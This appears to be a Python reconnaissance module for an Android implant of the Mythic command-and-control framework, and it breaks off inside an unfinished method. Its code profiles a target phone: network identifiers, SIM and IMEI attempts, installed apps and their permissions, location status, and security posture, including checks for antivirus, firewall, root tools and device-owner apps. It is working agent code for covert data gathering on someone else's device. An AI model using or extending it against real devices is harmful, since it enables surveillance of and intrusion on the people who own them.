
"""
Enhanced Device Information Gathering Module for Mythic Android Agent
Collects comprehensive device information including hardware specifications,
network information, security status, installed applications, system settings,
and operational data for the dashboard device details.

Features:
- Hardware specifications (CPU, memory, storage, battery)
- Network information (WiFi, cellular, VPN status)
- Security status (root detection, security patches, device encryption)
- Installed applications and permissions
- System settings and configurations
- Location services and GPS status
- Biometric and security features
- Performance metrics and resource usage
- Connectivity and service status
"""
import json
import time
import subprocess
import os
import re
import uuid
from typing import Dict, List, Any, Optional
from pathlib import Path
import socket
import platform


class AndroidDeviceProfiler:
    """Comprehensive Android device profiling and information gathering"""
    
    def __init__(self, agent_instance=None, logger=None):
        self.agent = agent_instance
        self.logger = logger
        self.device_cache = {}
        self.last_update = 0
        self.cache_ttl = 300
    
    def get_property(self, prop_name: str) -> str:
        """Get Android system property safely"""
        try:
            result = subprocess.check_output(
                ['getprop', prop_name],
                text=True,
                stderr=subprocess.DEVNULL,
                timeout=10
            ).strip()
            return result if result else "Unknown"
        except Exception:
            return "Unknown"
    
    def execute_command(self, command: List[str]) -> str:
        """Execute shell command safely"""
        try:
            result = subprocess.check_output(
                command,
                text=True,
                stderr=subprocess.DEVNULL,
                timeout=15
            ).strip()
            return result
        except Exception:
            return ""
    
    def get_hardware_info(self) -> Dict[str, Any]:
        """Get detailed hardware information"""
        hardware_info = {

            'manufacturer': self.get_property('ro.product.manufacturer'),
            'brand': self.get_property('ro.product.brand'),
            'model': self.get_property('ro.product.model'),
            'device': self.get_property('ro.product.device'),
            'board': self.get_property('ro.product.board'),
            'hardware': self.get_property('ro.hardware'),
            

            'cpu_abi': self.get_property('ro.product.cpu.abi'),
            'cpu_abi2': self.get_property('ro.product.cpu.abi2'),
            'cpu_cores': self._get_cpu_cores(),
            'cpu_freq': self._get_cpu_frequency(),
            'cpu_architecture': self._get_cpu_architecture(),
            

            'memory_total': self._get_memory_info()['total'],
            'memory_available': self._get_memory_info()['available'],
            'memory_usage': self._get_memory_usage(),
            

            'storage_internal': self._get_storage_info('internal'),
            'storage_external': self._get_storage_info('external'),
            

            'display_density': self.get_property('ro.sf.lcd_density'),
            'display_size': self._get_display_size(),
            'display_resolution': self._get_display_resolution(),
            

            'battery_level': self._get_battery_level(),
            'battery_status': self._get_battery_status(),
            'battery_health': self._get_battery_health(),
            'battery_temperature': self._get_battery_temperature(),
            

            'build_fingerprint': self.get_property('ro.build.fingerprint'),
            'build_id': self.get_property('ro.build.id'),
            'build_display_id': self.get_property('ro.build.display.id'),
            'build_tags': self.get_property('ro.build.tags'),
            'build_type': self.get_property('ro.build.type'),
            'build_user': self.get_property('ro.build.user'),
            'build_host': self.get_property('ro.build.host'),
            'build_date': self.get_property('ro.build.date'),
        }
        
        return hardware_info
    
    def get_android_version_info(self) -> Dict[str, Any]:
        """Get detailed Android version and security information"""
        return {
            'version_release': self.get_property('ro.build.version.release'),
            'version_sdk': self.get_property('ro.build.version.sdk'),
            'version_codename': self.get_property('ro.build.version.codename'),
            'version_incremental': self.get_property('ro.build.version.incremental'),
            'security_patch': self.get_property('ro.build.version.security_patch'),
            'bootloader': self.get_property('ro.bootloader'),
            'baseband': self.get_property('ro.baseband'),
            'kernel_version': self._get_kernel_version(),
            'selinux_status': self._get_selinux_status(),
            'api_level': self._get_api_level(),
            'google_play_services': self._check_google_play_services(),
        }
    
    def get_network_info(self) -> Dict[str, Any]:
        """Get comprehensive network information"""
        network_info = {

            'wifi_enabled': self._is_wifi_enabled(),
            'wifi_connected': self._is_wifi_connected(),
            'wifi_ssid': self._get_wifi_ssid(),
            'wifi_bssid': self._get_wifi_bssid(),
            'wifi_ip_address': self._get_wifi_ip(),
            'wifi_signal_strength': self._get_wifi_signal_strength(),
            

            'cellular_enabled': self._is_cellular_enabled(),
            'cellular_connected': self._is_cellular_connected(),
            'cellular_operator': self.get_property('gsm.operator.alpha'),
            'cellular_operator_code': self.get_property('gsm.operator.numeric'),
            'cellular_network_type': self._get_cellular_network_type(),
            'cellular_signal_strength': self._get_cellular_signal_strength(),
            'sim_state': self._get_sim_state(),
            'sim_operator': self._get_sim_operator(),
            'phone_number': self._get_phone_number(),
            'imei': self._get_imei(),
            'imsi': self._get_imsi(),
            

            'network_interfaces': self._get_network_interfaces(),
            'ip_addresses': self._get_ip_addresses(),
            'mac_addresses': self._get_mac_addresses(),
            

            'vpn_connected': self._is_vpn_connected(),
            'proxy_settings': self._get_proxy_settings(),
            

            'bluetooth_enabled': self._is_bluetooth_enabled(),
            'bluetooth_address': self._get_bluetooth_address(),
            'bluetooth_name': self._get_bluetooth_name(),
            

            'network_security_config': self._get_network_security_config(),
            'certificate_transparency': self._check_certificate_transparency(),
        }
        
        return network_info
    
    def get_security_status(self) -> Dict[str, Any]:
        """Get device security status and configuration"""
        security_status = {

            'root_detected': self._detect_root(),
            'bootloader_unlocked': self._is_bootloader_unlocked(),
            'system_integrity': self._check_system_integrity(),
            'magisk_detected': self._detect_magisk(),
            'xposed_detected': self._detect_xposed(),
            

            'device_encrypted': self._is_device_encrypted(),
            'screen_lock_enabled': self._is_screen_lock_enabled(),
            'fingerprint_enabled': self._is_fingerprint_enabled(),
            'face_unlock_enabled': self._is_face_unlock_enabled(),
            'smart_lock_enabled': self._is_smart_lock_enabled(),
            

            'unknown_sources_enabled': self._is_unknown_sources_enabled(),
            'adb_enabled': self._is_adb_enabled(),
            'developer_options_enabled': self._is_developer_options_enabled(),
            'usb_debugging_enabled': self._is_usb_debugging_enabled(),
            

            'device_admin_apps': self._get_device_admin_apps(),
            'device_owner': self._get_device_owner(),
            'profile_owner': self._get_profile_owner(),
            

            'security_patch_level': self.get_property('ro.build.version.security_patch'),
            'system_update_available': self._check_system_updates(),
            'google_play_protect_enabled': self._is_play_protect_enabled(),
            

            'suspicious_apps_detected': self._detect_suspicious_apps(),
            'antivirus_installed': self._detect_antivirus_apps(),
            'firewall_detected': self._detect_firewall(),
            

            'location_services_enabled': self._is_location_enabled(),
            'location_accuracy': self._get_location_accuracy(),
            'app_permissions_granted': self._get_dangerous_permissions(),
        }
        
        return security_status
    
    def get_installed_applications(self) -> List[Dict[str, Any]]:
        """Get comprehensive list of installed applications"""
        try:

            packages_output = self.execute_command(['pm', 'list', 'packages', '-f'])
            packages = []
            
            for line in packages_output.split('\n'):
                if line.startswith('package:'):

                    parts = line.replace('package:', '').split('=')
                    if len(parts) == 2:
                        package_path, package_name = parts
                        

                        package_info = self._get_package_details(package_name)
                        packages.append({
                            'name': package_name,
                            'path': package_path,
                            'version': package_info.get('version', 'Unknown'),
                            'version_code': package_info.get('version_code', 'Unknown'),
                            'first_install_time': package_info.get('first_install_time', 'Unknown'),
                            'last_update_time': package_info.get('last_update_time', 'Unknown'),
                            'permissions': package_info.get('permissions', []),
                            'system_app': package_info.get('system_app', False),
                            'enabled': package_info.get('enabled', True),
                            'target_sdk': package_info.get('target_sdk', 'Unknown'),
                            'min_sdk': package_info.get('min_sdk', 'Unknown'),
                        })
            
            return packages[:100]
            
        except Exception as e:
            if self.logger:
                self.logger.log_event('get_apps_error', str(e))
            return []
    
    def get_system_settings(self) -> Dict[str, Any]:
        """Get system settings and configurations"""
        settings = {

            'auto_brightness': self._get_setting('system', 'screen_brightness_mode'),
            'brightness_level': self._get_setting('system', 'screen_brightness'),
            'screen_timeout': self._get_setting('system', 'screen_off_timeout'),
            'auto_rotate': self._get_setting('system', 'accelerometer_rotation'),
            

            'sound_effects_enabled': self._get_setting('system', 'sound_effects_enabled'),
            'haptic_feedback_enabled': self._get_setting('system', 'haptic_feedback_enabled'),
            'notification_sound': self._get_setting('system', 'notification_sound'),
            'ringtone': self._get_setting('system', 'ringtone'),
            

            'location_providers_allowed': self._get_setting('secure', 'location_providers_allowed'),
            'mock_location': self._get_setting('secure', 'allow_mock_location'),
            'install_non_market_apps': self._get_setting('secure', 'install_non_market_apps'),
            

            'accessibility_enabled': self._get_setting('secure', 'accessibility_enabled'),
            'touch_exploration_enabled': self._get_setting('secure', 'touch_exploration_enabled'),
            

            'default_input_method': self._get_setting('secure', 'default_input_method'),
            'enabled_input_methods': self._get_setting('secure', 'enabled_input_methods'),
            

            'development_settings_enabled': self._get_setting('global', 'development_settings_enabled'),
            'adb_enabled': self._get_setting('global', 'adb_enabled'),
            'stay_on_while_plugged_in': self._get_setting('global', 'stay_on_while_plugged_in'),
        }
        
        return settings
    
    def get_location_info(self) -> Dict[str, Any]:
        """Get location services and GPS information"""
        location_info = {
            'location_enabled': self._is_location_enabled(),
            'gps_enabled': self._is_gps_enabled(),
            'network_location_enabled': self._is_network_location_enabled(),
            'passive_location_enabled': self._is_passive_location_enabled(),
            'location_mode': self._get_location_mode(),
            'last_known_location': self._get_last_known_location(),
            'location_providers': self._get_location_providers(),
            'mock_location_enabled': self._is_mock_location_enabled(),
            'location_history_enabled': self._is_location_history_enabled(),
        }
        
        return location_info
    
    def get_performance_metrics(self) -> Dict[str, Any]:
        """Get current performance metrics"""
        return {
            'cpu_usage': self._get_cpu_usage(),
            'memory_usage': self._get_memory_usage(),
            'storage_usage': self._get_storage_usage(),
            'battery_level': self._get_battery_level(),
            'temperature': self._get_device_temperature(),
            'network_stats': self._get_network_stats(),
            'process_count': self._get_process_count(),
            'uptime': self._get_uptime(),
        }
    
    def get_connectivity_status(self) -> Dict[str, Any]:
        """Get connectivity and service status"""
        return {
            'internet_connectivity': self._check_internet_connectivity(),
            'dns_connectivity': self._check_dns_connectivity(),
            'google_services_connectivity': self._check_google_services(),
            'play_store_connectivity': self._check_play_store(),
            'ntp_sync_status': self._get_ntp_sync_status(),
            'data_roaming_enabled': self._is_data_roaming_enabled(),
            'airplane_mode_enabled': self._is_airplane_mode_enabled(),
        }
    
    def collect_comprehensive_device_info(self) -> Dict[str, Any]:
        """Collect all device information for dashboard"""
        current_time = time.time()
        

        if (self.device_cache and
            current_time - self.last_update < self.cache_ttl):
            return self.device_cache
        
        device_info = {
            'timestamp': int(current_time),
            'device_id': str(uuid.uuid4()),
            'collection_version': '2.0.0',
            

            'hardware': self.get_hardware_info(),
            'android_version': self.get_android_version_info(),
            'network': self.get_network_info(),
            'security': self.get_security_status(),
            'system_settings': self.get_system_settings(),
            'location': self.get_location_info(),
            'performance': self.get_performance_metrics(),
            'connectivity': self.get_connectivity_status(),
            

            'installed_apps_count': self._get_installed_apps_count(),
            'system_apps_count': self._get_system_apps_count(),
            'recently_installed_apps': self._get_recently_installed_apps(),
            

            'data_collection_permissions': self._check_collection_permissions(),
            'device_compliance_score': self._calculate_compliance_score(),
        }
        

        self.device_cache = device_info
        self.last_update = current_time
        
        if self.logger:
            self.logger.log_event('device_info_collected', {
                'info_sections': list(device_info.keys()),
                'collection_time': time.time() - current_time
            })
        
        return device_info
    

    def _get_cpu_cores(self) -> int:
        """Get number of CPU cores"""
        try:
            with open('/proc/cpuinfo', 'r') as f:
                return len([line for line in f if line.startswith('processor')])
        except:
            return 1
    
    def _get_cpu_frequency(self) -> Dict[str, str]:
        """Get CPU frequency information"""
        try:
            freq_info = {}
            cpu_dirs = Path('/sys/devices/system/cpu').glob('cpu[0-9]*')
            for cpu_dir in cpu_dirs:
                try:
                    with open(cpu_dir / 'cpufreq' / 'scaling_cur_freq', 'r') as f:
                        freq_info[cpu_dir.name] = f.read().strip()
                except:
                    continue
            return freq_info
        except:
            return {}
    
    def _get_cpu_architecture(self) -> str:
        """Get CPU architecture"""
        try:
            with open('/proc/cpuinfo', 'r') as f:
                for line in f:
                    if 'Hardware' in line:
                        return line.split(':')[1].strip()
        except:
            pass
        return self.get_property('ro.product.cpu.abi')
    
    def _get_memory_info(self) -> Dict[str, int]:
        """Get memory information"""
        try:
            with open('/proc/meminfo', 'r') as f:
                meminfo = {}
                for line in f:
                    key, value = line.split(':')
                    meminfo[key] = int(value.split()[0]) * 1024
                
                return {
                    'total': meminfo.get('MemTotal', 0),
                    'available': meminfo.get('MemAvailable', meminfo.get('MemFree', 0)),
                    'free': meminfo.get('MemFree', 0),
                    'cached': meminfo.get('Cached', 0),
                    'buffers': meminfo.get('Buffers', 0),
                }
        except:
            return {'total': 0, 'available': 0, 'free': 0, 'cached': 0, 'buffers': 0}
    
    def _get_memory_usage(self) -> float:
        """Get current memory usage percentage"""
        mem_info = self._get_memory_info()
        if mem_info['total'] > 0:
            used = mem_info['total'] - mem_info['available']
            return round((used / mem_info['total']) * 100, 2)
        return 0.0
    
    def _get_storage_info(self, storage_type: str) -> Dict[str, int]:
        """Get storage information"""
        try:
            if storage_type == 'internal':
                path = '/data'
            else:
                path = '/storage/emulated/0'
                
            statvfs = os.statvfs(path)
            total = statvfs.f_frsize * statvfs.f_blocks
            available = statvfs.f_frsize * statvfs.f_available
            used = total - available
            
            return {
                'total': total,
                'used': used,
                'available': available,
                'usage_percent': round((used / total) * 100, 2) if total > 0 else 0
            }
        except:
            return {'total': 0, 'used': 0, 'available': 0, 'usage_percent': 0}
    
    def _get_battery_level(self) -> int:
        """Get battery level percentage"""
        try:
            result = self.execute_command(['dumpsys', 'battery'])
            for line in result.split('\n'):
                if 'level:' in line:
                    return int(line.split(':')[1].strip())
        except:
            pass
        return -1
    
    def _get_battery_status(self) -> str:
        """Get battery charging status"""
        try:
            result = self.execute_command(['dumpsys', 'battery'])
            for line in result.split('\n'):
                if 'status:' in line:
                    status_code = int(line.split(':')[1].strip())
                    status_map = {1: 'Unknown', 2: 'Charging', 3: 'Discharging', 4: 'Not charging', 5: 'Full'}
                    return status_map.get(status_code, 'Unknown')
        except:
            pass
        return 'Unknown'
    
    def _get_battery_health(self) -> str:
        """Get battery health status"""
        try:
            result = self.execute_command(['dumpsys', 'battery'])
            for line in result.split('\n'):
                if 'health:' in line:
                    health_code = int(line.split(':')[1].strip())
                    health_map = {1: 'Unknown', 2: 'Good', 3: 'Overheat', 4: 'Dead', 5: 'Over voltage', 6: 'Unspecified failure', 7: 'Cold'}
                    return health_map.get(health_code, 'Unknown')
        except:
            pass
        return 'Unknown'
    
    def _get_battery_temperature(self) -> float:
        """Get battery temperature in Celsius"""
        try:
            result = self.execute_command(['dumpsys', 'battery'])
            for line in result.split('\n'):
                if 'temperature:' in line:
                    temp = int(line.split(':')[1].strip())
                    return temp / 10.0
        except:
            pass
        return 0.0


    def _get_display_size(self) -> str:
        """Get display size information"""
        try:
            result = self.execute_command(['wm', 'size'])
            return result.split(':')[1].strip() if ':' in result else 'Unknown'
        except:
            return 'Unknown'
    
    def _get_display_resolution(self) -> str:
        """Get display resolution"""
        try:
            result = self.execute_command(['dumpsys', 'display'])
            for line in result.split('\n'):
                if 'mBaseDisplayInfo' in line and 'x' in line:
                    return re.search(r'(\d+x\d+)', line).group(1)
        except:
            pass
        return 'Unknown'
    
    def _get_kernel_version(self) -> str:
        """Get kernel version"""
        try:
            with open('/proc/version', 'r') as f:
                return f.read().strip()[:100]
        except:
            return 'Unknown'
    
    def _get_selinux_status(self) -> str:
        """Get SELinux status"""
        return self.get_property('ro.build.selinux')
    
    def _get_api_level(self) -> int:
        """Get Android API level"""
        try:
            return int(self.get_property('ro.build.version.sdk'))
        except:
            return 0
    
    def _check_google_play_services(self) -> bool:
        """Check if Google Play Services is installed"""
        try:
            result = self.execute_command(['pm', 'list', 'packages', 'com.google.android.gms'])
            return 'com.google.android.gms' in result
        except:
            return False
    
    def _is_wifi_enabled(self) -> bool:
        """Check if WiFi is enabled"""
        try:
            result = self.execute_command(['dumpsys', 'wifi'])
            return 'Wi-Fi is enabled' in result or 'mWifiEnabled: true' in result
        except:
            return False
    
    def _is_wifi_connected(self) -> bool:
        """Check if WiFi is connected"""
        try:
            result = self.execute_command(['dumpsys', 'wifi'])
            return 'mNetworkInfo: [WIFI' in result and 'CONNECTED' in result
        except:
            return False
    
    def _get_wifi_ssid(self) -> str:
        """Get current WiFi SSID"""
        try:
            result = self.execute_command(['dumpsys', 'wifi'])
            for line in result.split('\n'):
                if 'mWifiInfo' in line and 'SSID:' in line:
                    ssid_match = re.search(r'SSID: ([^,]+)', line)
                    return ssid_match.group(1).strip('"') if ssid_match else 'Unknown'
        except:
            pass
        return 'Unknown'
    
    def _get_wifi_bssid(self) -> str:
        """Get current WiFi BSSID"""
        try:
            result = self.execute_command(['dumpsys', 'wifi'])
            for line in result.split('\n'):
                if 'BSSID:' in line:
                    bssid_match = re.search(r'BSSID: ([a-fA-F0-9:]+)', line)
                    return bssid_match.group(1) if bssid_match else 'Unknown'
        except:
            pass
        return 'Unknown'
    
    def _get_wifi_ip(self) -> str:
        """Get WiFi IP address"""
        try:
            result = self.execute_command(['ip', 'route', 'get', '1.1.1.1'])
            ip_match = re.search(r'src (\d+\.\d+\.\d+\.\d+)', result)
            return ip_match.group(1) if ip_match else 'Unknown'
        except:
            pass
        return 'Unknown'
    
    def _get_wifi_signal_strength(self) -> int:
        """Get WiFi signal strength"""
        try:
            result = self.execute_command(['dumpsys', 'wifi'])
            for line in result.split('\n'):
                if 'Rssi:' in line:
                    rssi_match = re.search(r'Rssi: (-?\d+)', line)
                    return int(rssi_match.group(1)) if rssi_match else -100
        except:
            pass
        return -100
    
    def _is_cellular_enabled(self) -> bool:
        """Check if cellular is enabled"""
        try:
            result = self.execute_command(['dumpsys', 'telephony.registry'])
            return 'mDataConnectionState=2' in result
        except:
            return False
    
    def _is_cellular_connected(self) -> bool:
        """Check if cellular is connected"""
        try:
            result = self.execute_command(['dumpsys', 'connectivity'])
            return 'NetworkInfo: [MOBILE' in result and 'CONNECTED' in result
        except:
            return False
    
    def _get_cellular_network_type(self) -> str:
        """Get cellular network type"""
        try:
            result = self.execute_command(['dumpsys', 'telephony.registry'])
            for line in result.split('\n'):
                if 'mDataConnectionNetworkType' in line:
                    net_type = line.split('=')[1].strip()
                    type_map = {'0': 'Unknown', '1': 'GPRS', '2': 'EDGE', '3': 'UMTS',
                               '9': 'HSDPA', '10': 'HSUPA', '11': 'HSPA', '13': 'LTE',
                               '20': '5G'}
                    return type_map.get(net_type, f'Type_{net_type}')
        except:
            pass
        return 'Unknown'
    
    def _get_cellular_signal_strength(self) -> int:
        """Get cellular signal strength"""
        try:
            result = self.execute_command(['dumpsys', 'telephony.registry'])
            for line in result.split('\n'):
                if 'mSignalStrength' in line:
                    strength_match = re.search(r'SignalStrength: (-?\d+)', line)
                    return int(strength_match.group(1)) if strength_match else -113
        except:
            pass
        return -113
    
    def _get_sim_state(self) -> str:
        """Get SIM card state"""
        return self.get_property('gsm.sim.state')
    
    def _get_sim_operator(self) -> str:
        """Get SIM operator"""
        return self.get_property('gsm.sim.operator.alpha')
    
    def _get_phone_number(self) -> str:
        """Get phone number (may be restricted)"""
        try:
            result = self.execute_command(['dumpsys', 'iphonesubinfo'])

            return 'Restricted' if 'Permission Denial' in result else 'Unknown'
        except:
            return 'Unknown'
    
    def _get_imei(self) -> str:
        """Get IMEI (may be restricted)"""
        try:
            result = self.execute_command(['dumpsys', 'iphonesubinfo'])
            return 'Restricted' if 'Permission Denial' in result else 'Unknown'
        except:
            return 'Unknown'
    
    def _get_imsi(self) -> str:
        """Get IMSI (may be restricted)"""
        try:
            result = self.execute_command(['dumpsys', 'iphonesubinfo'])
            return 'Restricted' if 'Permission Denial' in result else 'Unknown'
        except:
            return 'Unknown'
    
    def _get_network_interfaces(self) -> List[str]:
        """Get network interfaces"""
        try:
            result = self.execute_command(['ip', 'link', 'show'])
            interfaces = re.findall(r'\d+: ([^:@]+)', result)
            return [iface.strip() for iface in interfaces]
        except:
            return []
    
    def _get_ip_addresses(self) -> Dict[str, str]:
        """Get IP addresses for interfaces"""
        try:
            result = self.execute_command(['ip', 'addr', 'show'])
            ip_addresses = {}
            current_interface = None
            
            for line in result.split('\n'):
                if ': ' in line and 'inet' not in line:
                    interface_match = re.search(r'\d+: ([^:@]+)', line)
                    if interface_match:
                        current_interface = interface_match.group(1).strip()
                elif 'inet ' in line and current_interface:
                    ip_match = re.search(r'inet (\d+\.\d+\.\d+\.\d+)', line)
                    if ip_match:
                        ip_addresses[current_interface] = ip_match.group(1)
            
            return ip_addresses
        except:
            return {}
    
    def _get_mac_addresses(self) -> Dict[str, str]:
        """Get MAC addresses for interfaces"""
        try:
            result = self.execute_command(['ip', 'link', 'show'])
            mac_addresses = {}
            current_interface = None
            
            for line in result.split('\n'):
                if ': ' in line:
                    interface_match = re.search(r'\d+: ([^:@]+)', line)
                    if interface_match:
                        current_interface = interface_match.group(1).strip()
                elif 'link/ether' in line and current_interface:
                    mac_match = re.search(r'link/ether ([a-fA-F0-9:]+)', line)
                    if mac_match:
                        mac_addresses[current_interface] = mac_match.group(1)
            
            return mac_addresses
        except:
            return {}
    
    def _is_vpn_connected(self) -> bool:
        """Check if VPN is connected"""
        try:
            result = self.execute_command(['dumpsys', 'connectivity'])
            return 'VPN' in result and 'CONNECTED' in result
        except:
            return False
    
    def _get_proxy_settings(self) -> Dict[str, str]:
        """Get proxy settings"""
        try:
            proxy_info = {
                'http_proxy': self._get_setting('global', 'http_proxy'),
                'https_proxy': self._get_setting('global', 'https_proxy'),
                'ftp_proxy': self._get_setting('global', 'ftp_proxy')
            }
            return {k: v for k, v in proxy_info.items() if v and v != 'null'}
        except:
            return {}
    
    def _is_bluetooth_enabled(self) -> bool:
        """Check if Bluetooth is enabled"""
        try:
            result = self.execute_command(['dumpsys', 'bluetooth_manager'])
            return 'enabled: true' in result
        except:
            return False
    
    def _get_bluetooth_address(self) -> str:
        """Get Bluetooth MAC address"""
        try:
            result = self.execute_command(['dumpsys', 'bluetooth_manager'])
            for line in result.split('\n'):
                if 'address:' in line:
                    addr_match = re.search(r'address: ([a-fA-F0-9:]+)', line)
                    return addr_match.group(1) if addr_match else 'Unknown'
        except:
            pass
        return 'Unknown'
    
    def _get_bluetooth_name(self) -> str:
        """Get Bluetooth device name"""
        return self.get_property('bluetooth.device.name')
    
    def _get_network_security_config(self) -> str:
        """Get network security configuration"""
        try:
            result = self.execute_command(['dumpsys', 'network_management'])
            return 'Configured' if 'NetworkSecurityConfig' in result else 'Default'
        except:
            return 'Unknown'
    
    def _check_certificate_transparency(self) -> bool:
        """Check certificate transparency support"""
        try:
            result = self.execute_command(['dumpsys', 'trust'])
            return 'CertificateTransparency' in result
        except:
            return False
    
    def _detect_root(self) -> bool:
        """Detect root access"""
        root_indicators = [
            '/system/bin/su', '/system/xbin/su', '/sbin/su',
            '/system/app/Superuser.apk', '/system/app/SuperSU.apk'
        ]
        
        for indicator in root_indicators:
            if os.path.exists(indicator):
                return True
        
        try:
            subprocess.check_output(['which', 'su'], stderr=subprocess.DEVNULL)
            return True
        except:
            pass
        
        return False
    
    def _is_bootloader_unlocked(self) -> bool:
        """Check if bootloader is unlocked"""
        unlock_status = self.get_property('ro.boot.flash.locked')
        return unlock_status == '0' or unlock_status.lower() == 'false'
    
    def _check_system_integrity(self) -> str:
        """Check system integrity"""
        try:

            result = self.execute_command(['cat', '/proc/mounts'])
            for line in result.split('\n'):
                if '/system' in line and 'rw' in line:
                    return 'Modified'
            return 'Intact'
        except:
            return 'Unknown'
    
    def _detect_magisk(self) -> bool:
        """Detect Magisk root manager"""
        magisk_indicators = [
            '/sbin/.magisk', '/system/app/Magisk',
            '/data/adb/magisk', '/cache/magisk.log'
        ]
        return any(os.path.exists(indicator) for indicator in magisk_indicators)
    
    def _detect_xposed(self) -> bool:
        """Detect Xposed framework"""
        xposed_indicators = [
            '/system/framework/XposedBridge.jar',
            '/system/bin/app_process_xposed'
        ]
        return any(os.path.exists(indicator) for indicator in xposed_indicators)
    
    def _is_device_encrypted(self) -> bool:
        """Check if device storage is encrypted"""
        encryption_status = self.get_property('ro.crypto.state')
        return encryption_status == 'encrypted'
    
    def _is_screen_lock_enabled(self) -> bool:
        """Check if screen lock is enabled"""
        try:
            lock_pattern = self._get_setting('secure', 'lock_pattern_enabled')
            lock_password = self._get_setting('secure', 'lockscreen.password_type')
            return lock_pattern == '1' or (lock_password and lock_password != '0')
        except:
            return False
    
    def _is_fingerprint_enabled(self) -> bool:
        """Check if fingerprint authentication is enabled"""
        try:
            result = self.execute_command(['dumpsys', 'fingerprint'])
            return 'Enrolled fingerprints:' in result and 'size=0' not in result
        except:
            return False
    
    def _is_face_unlock_enabled(self) -> bool:
        """Check if face unlock is enabled"""
        try:
            result = self.execute_command(['dumpsys', 'face'])
            return 'Face enrolled' in result or 'Face templates enrolled' in result
        except:
            return False
    
    def _is_smart_lock_enabled(self) -> bool:
        """Check if Smart Lock is enabled"""
        try:
            smart_lock = self._get_setting('secure', 'trust_agents_enabled')
            return smart_lock == '1'
        except:
            return False
    
    def _is_unknown_sources_enabled(self) -> bool:
        """Check if installation from unknown sources is enabled"""
        unknown_sources = self._get_setting('secure', 'install_non_market_apps')
        return unknown_sources == '1'
    
    def _is_adb_enabled(self) -> bool:
        """Check if ADB is enabled"""
        adb_enabled = self._get_setting('global', 'adb_enabled')
        return adb_enabled == '1'
    
    def _is_developer_options_enabled(self) -> bool:
        """Check if developer options are enabled"""
        dev_options = self._get_setting('global', 'development_settings_enabled')
        return dev_options == '1'
    
    def _is_usb_debugging_enabled(self) -> bool:
        """Check if USB debugging is enabled"""
        return self._is_adb_enabled()
    
    def _get_device_admin_apps(self) -> List[str]:
        """Get device administrator applications"""
        try:
            result = self.execute_command(['dumpsys', 'device_policy'])
            admin_apps = []
            for line in result.split('\n'):
                if 'Admin:' in line:
                    app_match = re.search(r'Admin: ComponentInfo\{([^}]+)\}', line)
                    if app_match:
                        admin_apps.append(app_match.group(1))
            return admin_apps
        except:
            return []
    
    def _get_device_owner(self) -> str:
        """Get device owner application"""
        try:
            result = self.execute_command(['dumpsys', 'device_policy'])
            for line in result.split('\n'):
                if 'Device Owner:' in line:
                    return line.split(':')[1].strip()
        except:
            pass
        return 'None'
    
    def _get_profile_owner(self) -> str:
        """Get profile owner application"""
        try:
            result = self.execute_command(['dumpsys', 'device_policy'])
            for line in result.split('\n'):
                if 'Profile Owner:' in line:
                    return line.split(':')[1].strip()
        except:
            pass
        return 'None'
    
    def _get_setting(self, namespace: str, key: str) -> str:
        """Get system setting value"""
        try:
            result = self.execute_command(['settings', 'get', namespace, key])
            return result.strip() if result.strip() != 'null' else ''
        except:
            return ''
    
    def _is_location_enabled(self) -> bool:
        """Check if location services are enabled"""
        try:
            location_mode = self._get_setting('secure', 'location_mode')
            return location_mode != '0' and location_mode != ''
        except:
            return False
    
    def _get_cpu_usage(self) -> float:
        """Get current CPU usage percentage"""
        try:

            result = self.execute_command(['cat', '/proc/loadavg'])
            load_avg = float(result.split()[0])
            cpu_cores = self._get_cpu_cores()
            return min(round((load_avg / cpu_cores) * 100, 2), 100.0)
        except:
            return 0.0
    
    def _get_storage_usage(self) -> Dict[str, float]:
        """Get storage usage for internal and external storage"""
        return {
            'internal': self._get_storage_info('internal')['usage_percent'],
            'external': self._get_storage_info('external')['usage_percent']
        }
    
    def _get_device_temperature(self) -> float:
        """Get device temperature"""
        try:

            thermal_files = Path('/sys/class/thermal').glob('thermal_zone*/temp')
            temperatures = []
            
            for temp_file in thermal_files:
                try:
                    with open(temp_file, 'r') as f:
                        temp = int(f.read().strip()) / 1000.0
                        if 10 < temp < 100:
                            temperatures.append(temp)
                except:
                    continue
            
            return round(sum(temperatures) / len(temperatures), 1) if temperatures else 0.0
        except:
            return 0.0
    
    def _get_network_stats(self) -> Dict[str, int]:
        """Get network statistics"""
        try:
            result = self.execute_command(['cat', '/proc/net/dev'])
            stats = {'rx_bytes': 0, 'tx_bytes': 0}
            
            for line in result.split('\n')[2:]:
                if ':' in line:
                    parts = line.split()
                    if len(parts) >= 10:
                        rx_bytes = int(parts[1])
                        tx_bytes = int(parts[9])
                        stats['rx_bytes'] += rx_bytes
                        stats['tx_bytes'] += tx_bytes
            
            return stats
        except:
            return {'rx_bytes': 0, 'tx_bytes': 0}
    
    def _get_process_count(self) -> int:
        """Get number of running processes"""
        try:
            result = self.execute_command(['ps', '-A'])
            return len(result.split('\n')) - 1
        except:
            return 0
    
    def _get_uptime(self) -> float:
        """Get system uptime in seconds"""
        try:
            with open('/proc/uptime', 'r') as f:
                return float(f.read().split()[0])
        except:
            return 0.0
    
    def _check_internet_connectivity(self) -> bool:
        """Check internet connectivity"""
        try:
            socket.create_connection(('8.8.8.8', 53), timeout=5)
            return True
        except:
            return False
    
    def _check_dns_connectivity(self) -> bool:
        """Check DNS connectivity"""
        try:
            socket.gethostbyname('google.com')
            return True
        except:
            return False
    
    def _check_google_services(self) -> bool:
        """Check Google services connectivity"""
        try:
            socket.create_connection(('googleapis.com', 443), timeout=5)
            return True
        except:
            return False
    
    def _check_play_store(self) -> bool:
        """Check Play Store connectivity"""
        try:
            socket.create_connection(('play.google.com', 443), timeout=5)
            return True
        except:
            return False
    
    def _get_ntp_sync_status(self) -> bool:
        """Check NTP synchronization status"""
        try:
            auto_time = self._get_setting('global', 'auto_time')
            return auto_time == '1'
        except:
            return False
    
    def _is_data_roaming_enabled(self) -> bool:
        """Check if data roaming is enabled"""
        data_roaming = self._get_setting('global', 'data_roaming')
        return data_roaming == '1'
    
    def _is_airplane_mode_enabled(self) -> bool:
        """Check if airplane mode is enabled"""
        airplane_mode = self._get_setting('global', 'airplane_mode_on')
        return airplane_mode == '1'
    
    def _get_installed_apps_count(self) -> int:
        """Get count of installed applications"""
        try:
            result = self.execute_command(['pm', 'list', 'packages'])
            return len(result.split('\n')) - 1
        except:
            return 0
    
    def _get_system_apps_count(self) -> int:
        """Get count of system applications"""
        try:
            result = self.execute_command(['pm', 'list', 'packages', '-s'])
            return len(result.split('\n')) - 1
        except:
            return 0
    
    def _get_recently_installed_apps(self) -> List[str]:
        """Get recently installed applications"""
        try:


            return []
        except:
            return []
    
    def _get_package_details(self, package_name: str) -> Dict[str, Any]:
